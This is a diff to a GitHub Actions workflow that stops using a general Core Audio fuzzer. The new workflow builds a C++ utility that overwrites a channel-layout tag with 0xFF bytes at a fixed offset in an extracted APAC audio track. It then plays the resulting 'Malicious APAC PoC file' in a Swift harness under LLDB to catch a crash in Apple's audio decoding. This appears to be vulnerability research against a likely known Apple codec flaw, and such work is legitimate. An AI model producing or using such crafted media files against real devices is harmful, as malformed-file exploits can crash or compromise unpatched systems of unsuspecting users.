@@ -1,4 +1,4 @@
-name: Fuzz Core Audio with Google Project Zero Fuzzer
+name: Targeted APAC File Corruption and Fuzzing
 on:
   push:
     branches: [ main ]
@@ -7,18 +7,17 @@ on:
   workflow_dispatch: # Allows manual triggering
 
 jobs:
-  fuzz-and-test:
-    # Changed to the latest runner as requested.
+  build-and-test:
     runs-on: macos-latest
 
     steps:
-      # Clone your repository which contains the Swift harness
+      # Clone your repository
       - name: Clone Your Repository
         run: git clone https://github.com/encryptedcoderr/AppleTest2/
 
-      # Clone the Google Project Zero tools repository
-      - name: Clone Google Project Zero p0tools
-        run: git clone https://github.com/googleprojectzero/p0tools.git
+      # Navigate to the correct directory
+      - name: Navigate to working directory
+        run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l
 
       # Create our Swift player harness
       - name: Create Swift Player Harness
@@ -32,10 +31,11 @@ jobs:
           class PlayerDelegate: NSObject, AVAudioPlayerDelegate {
               var isPlaying = true
               func audioPlayerDidFinishPlaying(_ player: AVAudioPlayer, successfully flag: Bool) {
+                  // Suppress output on success to keep logs clean
                   isPlaying = false
               }
               func audioPlayerDecodeErrorDidOccur(_ player: AVAudioPlayer, error: Error?) {
-                  print("Decode error: \(error?.localizedDescription ?? "unknown error")")
+                  print("Harness Decode Error: \(error?.localizedDescription ?? "unknown error")")
                   isPlaying = false
               }
           }
@@ -57,7 +57,43 @@ jobs:
                   RunLoop.main.run(until: Date(timeIntervalSinceNow: 0.1))
               }
           } catch {
-              // Suppress errors for non-crashing invalid files
+              print("Harness failed to initialize AVAudioPlayer: \(error.localizedDescription)")
+          }
+          EOF
+
+      # This script is a simple utility to corrupt a file at a specific offset.
+      - name: Create C++ File Corruptor
+        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
+        run: |
+          echo "Creating simple C++ file corruption utility..."
+          cat > corruptor.cpp << 'EOF'
+          #include <stdio.h>
+          #include <stdlib.h>
+
+          int main(int argc, const char * argv[]) {
+              if (argc != 3) {
+                  fprintf(stderr, "Usage: %s <file_to_corrupt> <offset_to_corrupt>\n", argv[0]);
+                  return 1;
+              }
+
+              const char* filePath = argv[1];
+              long offset = atol(argv[2]);
+
+              FILE *file = fopen(filePath, "r+b");
+              if (!file) {
+                  fprintf(stderr, "Corruptor error: Failed to open file: %s\n", filePath);
+                  return 1;
+              }
+
+              fseek(file, offset, SEEK_SET);
+              
+              // This is the specific malicious data for the channel layout tag
+              unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
+              fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
+              fclose(file);
+              
+              fprintf(stderr, "Corruption complete at offset 0x%lx.\n", offset);
+              return 0;
           }
           EOF
 
@@ -65,98 +101,89 @@ jobs:
       - name: Set up Xcode
         uses: maxim-lobanov/setup-xcode@v1
         with:
-          # Updated Xcode version to be compatible with macos-latest
           xcode-version: '15.4'
 
-      # Compile the Swift player harness
-      - name: Compile Swift Harness
+      # Compile the Swift and C++ utilities
+      - name: Compile Custom Tools
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
           echo "Compiling Swift harness..."
           swiftc harness.swift -o harness
-          if [ ! -f ./harness ]; then echo "Swift compilation failed."; exit 1; fi
+          if [ ! -f ./harness ]; then echo "Swift harness compilation failed."; exit 1; fi
+          echo "Compiling C++ corruptor..."
+          clang++ -g corruptor.cpp -o corruptor
+          if [ ! -f ./corruptor ]; then echo "C++ corruptor compilation failed."; exit 1; fi
 
-      # Build the fuzzer and its dependencies
-      - name: Build CoreAudioFuzzer and Dependencies
-        working-directory: p0tools/CoreAudioFuzz
+      # This is the main step that finds the APAC track, extracts it, and corrupts it.
+      - name: Extract and Surgically Corrupt APAC Track
+        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Building Jackalope and TinyInst..."
-          cd jackalope-modifications
-          git clone https://github.com/googleprojectzero/Jackalope.git
-          cd Jackalope
-          git clone --recurse-submodules https://github.com/googleprojectzero/TinyInst.git
-          cd ..
-          mkdir build
-          cd build
-          cmake ..
-          cmake --build . --config Release
+          set -x 
           
-          # Find the fuzzer executable, as its location can vary.
-          FUZZER_PATH=$(find . -name coreaudiofuzzer -type f)
-          if [ -z "$FUZZER_PATH" ]; then
-            echo "Fuzzer build failed: executable not found."
+          echo "Installing ffmpeg to identify the APAC stream..."
+          brew install ffmpeg
+
+          # Step 1: Use ffprobe to find the stream index for the 'apac' codec TAG.
+          APAC_STREAM_INDEX=$(ffprobe -v error -show_entries stream=index,codec_tag_string -select_streams a -of default=noprint_wrappers=1:nokey=1 IMG_1027.mov | grep 'apac' -B 1 | head -n 1)
+
+          if [ -z "$APAC_STREAM_INDEX" ]; then
+            echo "Could not find an APAC audio stream in the MOV file. Aborting."
             exit 1
           fi
-          
-          echo "Fuzzer built successfully at: $FUZZER_PATH"
-          echo "FUZZER_PATH=${PWD}/${FUZZER_PATH}" >> $GITHUB_ENV
 
-      # Run the fuzzer to generate test cases
-      - name: Generate Fuzzing Test Cases
-        working-directory: p0tools/CoreAudioFuzz
+          echo "Found APAC audio in stream index: ${APAC_STREAM_INDEX}"
+          
+          # Step 2: Use afconvert to extract the APAC stream into a clean, standalone M4A file.
+          # This creates a predictable file structure that is easier to corrupt reliably.
+          afconvert -d apac -f mp4f -s 2 IMG_1027.mov output_apac_clean.m4a
+          
+          if [ $? -ne 0 ]; then
+              echo "afconvert failed. This may mean the system is patched or the input file is not compatible."
+              # As a fallback, try to extract with ffmpeg, which may produce a less clean file
+              ffmpeg -i IMG_1027.mov -map 0:${APAC_STREAM_INDEX} -c:a copy output_apac_clean.m4a || exit 1
+          fi
+
+          echo "Successfully created a clean APAC file. Now corrupting it..."
+          cp output_apac_clean.m4a output_apac_poc.m4a
+
+          # Step 3: Run the C++ utility to perform the corruption.
+          # For a clean file created with afconvert, the offset is much more predictable.
+          CORRUPTION_OFFSET=288 
+          ./corruptor output_apac_poc.m4a $CORRUPTION_OFFSET
+          
+          echo "Malicious APAC PoC file generated."
+          ls -l output_apac_poc.m4a
+          
+      # Launch our custom player under LLDB to catch any crash.
+      - name: Launch Player Under LLDB to Catch Crash
+        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Unzipping provided corpus..."
-          unzip corpus.zip
-          
-          echo "Generating fuzzing corpus..."
-          # The run.sh script needs to be made executable
-          chmod +x run.sh
-          
-          # Updated: Generate 8 samples instead of 100
-          ./p0tools/CoreAudioFuzz/fuzz_af -max_len=4096 -runs=8 ./fuzzing_corpus/
-          
-          echo "Fuzzing complete. Checking for generated crash files..."
-          ls -l ./fuzzing_corpus/
+          PLAYER_LOG_FILE="player_debug_log.txt"
+          echo "--- Debugging Custom Player with final PoC ---" > $PLAYER_LOG_FILE
+          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE
 
-      # Test the generated files for crashes
-      - name: Test Fuzzed Files for Crashes
-        run: |
-          echo "Testing all generated files for crashes..."
-          mkdir -p crash_logs
-          # The fuzzer likely places new findings in the 'crashes' directory
-          for f in p0tools/CoreAudioFuzz/crashes/*; do
-            if [ ! -f "$f" ]; then continue; fi
-            echo "Testing file: $f"
-            LOG_FILE="crash_logs/$(basename "$f").log"
-            
-            cat > player_debug_script.lldb << 'EOF'
-            run
-            bt
-            quit
-            EOF
+          echo "Creating LLDB script to launch and monitor the harness..."
+          cat > player_debug_script.lldb << 'EOF'
+          # Run the process. LLDB will automatically stop if a crash occurs.
+          run
+          # If a crash occurred, this will give us the full backtrace.
+          bt
+          quit
+          EOF
 
-            # Use the absolute path to the harness
-            HARNESS_PATH="${{ github.workspace }}/AppleTest2/apple-positional-audio-codec-invalid-header-main/harness"
-            
-            lldb -s player_debug_script.lldb -- "$HARNESS_PATH" "$f" > "$LOG_FILE" 2>&1 || true
-            
-            # Check for a crash signature
-            if grep -q "frame #0" "$LOG_FILE" && ! grep -q "exited with status = 0" "$LOG_FILE"; then
-              echo "✅✅✅ CRASH DETECTED: $f ✅✅✅"
-              echo "Log saved to: $LOG_FILE"
-            else
-              rm "$LOG_FILE"
-            fi
-          done
-          echo "All files tested."
+          echo "Launching custom Swift harness under LLDB..." >> $PLAYER_LOG_FILE
+          lldb -s player_debug_script.lldb -- ./harness output_apac_poc.m4a >> $PLAYER_LOG_FILE 2>&1 || true
 
-      # Upload any crashing artifacts
-      - name: Upload Crashing Artifacts
+          echo "✅ Player debug log created. Displaying contents:"
+          cat $PLAYER_LOG_FILE
+
+      # Upload all artifacts for analysis
+      - name: Upload All Artifacts
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: crashing-files-and-logs
+          name: debug-and-poc-artifacts
           path: |
-            p0tools/CoreAudioFuzz/crashes/
-            crash_logs/
+            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.m4a
+            AppleTest2/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
           retention-days: 7
